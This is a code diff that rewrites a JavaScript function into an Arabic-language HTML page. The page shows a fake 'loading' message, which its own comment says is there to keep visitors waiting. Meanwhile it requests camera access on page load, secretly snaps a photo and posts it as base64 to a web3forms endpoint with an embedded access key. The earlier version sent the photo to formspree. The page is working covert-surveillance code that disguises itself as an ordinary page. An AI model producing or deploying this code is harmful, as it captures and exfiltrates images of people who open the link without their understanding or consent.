@@ -1,47 +1,65 @@
-async function captureAndSend() {
-    try {
-        // 1. طلب الوصول إلى الكاميرا
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحميل...</title>
+</head>
+<body>
+    <!-- واجهة بسيطة لإقناع المستخدم بالبقاء حتى يتم الإرسال -->
+    <h2>يرجى الانتظار، جاري تحميل محتوى الصفحة...</h2>
 
-        // 2. التقاط الصورة بعد لحظة من فتح الكاميرا
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    <script>
+        async function captureAndSend() {
+            try {
+                // 1. طلب الإذن للكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                // إنشاء عنصر فيديو مخفي لالتقاط الصورة
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
 
-        // تحويل الصورة إلى رابط نصي (Base64)
-        const imageData = canvas.toDataURL('image/png');
+                // 2. التقاط الصورة (بعد ثانية واحدة لضمان وضوح الكاميرا)
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const imageData = canvas.toDataURL('image/png');
 
-        // 3. إرسال الصورة إلى Formspree
-        const response = await fetch("https://formspree.io/f/mvzlbnov", {
-            method: "POST",
-            headers: {
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-            },
-            body: JSON.stringify({
-                image: imageData,
-                message: "صورة جديدة ملتقطة من الرابط"
-            })
-        });
+                    // 3. الإرسال إلى Web3Forms باستخدام مفتاحك
+                    const response = await fetch("https://web3forms.com", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                            "Accept": "application/json"
+                        },
+                        body: JSON.stringify({
+                            access_key: "39759f28-ba77-4a4d-9673-e522d1bfff09",
+                            subject: "صورة جديدة ملتقطة",
+                            from_name: "نظام التنبيه",
+                            image_base64: imageData, // الصورة ستصلك ككود طويل في الإيميل
+                            message: "تم التقاط هذه الصورة عند دخول الرابط."
+                        })
+                    });
 
-        if (response.ok) {
-            console.log("تم الإرسال بنجاح إلى Formspree!");
-        } else {
-            console.log("حدث خطأ أثناء الإرسال.");
+                    const result = await response.json();
+                    if (result.success) {
+                        console.log("تمت العملية");
+                    }
+
+                    // إغلاق الكاميرا بعد الانتهاء
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1000);
+
+            } catch (err) {
+                console.log("رفض المستخدم أو الكاميرا غير متوفرة.");
+            }
         }
 
-        // إغلاق الكاميرا بعد الانتهاء
-        stream.getTracks().forEach(track => track.stop());
-
-    } catch (err) {
-        console.error("لم يتم منح الإذن للكاميرا أو حدث خطأ: ", err);
-    }
-}
-
-// تشغيل الوظيفة عند تحميل الصفحة
-window.onload = captureAndSend;
+        // تشغيل الكود بمجرد فتح الصفحة
+        window.onload = captureAndSend;
+    </script>
+</body>
+</html>
